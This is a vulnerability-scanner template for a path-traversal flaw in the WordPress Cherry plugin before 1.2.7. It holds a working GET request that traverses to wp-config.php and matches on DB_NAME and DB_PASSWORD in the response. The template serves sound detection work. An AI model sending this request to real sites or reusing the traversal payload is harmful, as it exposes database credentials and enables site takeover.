id: cherry-file-download
name: Cherry Plugin < 1.2.7 - Arbitrary File Retrieval and File Upload
severity: high
confidence: tentative
description: WordPress plugin Cherry < 1.2.7 contains an unauthenticated file upload and download vulnerability, allowing
  attackers to upload and download arbitrary files. This could result in attacker uploading backdoor shell scripts or downloading
  the wp-config.php file.
reference: CWE-22
tags:
- wordpress
- wp-plugin
- lfi
- wpscan
- vuln
requests:
- method: GET
  path: /wp-content/plugins/cherry-plugin/admin/import-export/download-content.php?file=../../../../../wp-config.php
  matchers:
  - type: body
    words:
    - DB_NAME
    - DB_PASSWORD
  - type: status
    status:
    - 200
  condition: and
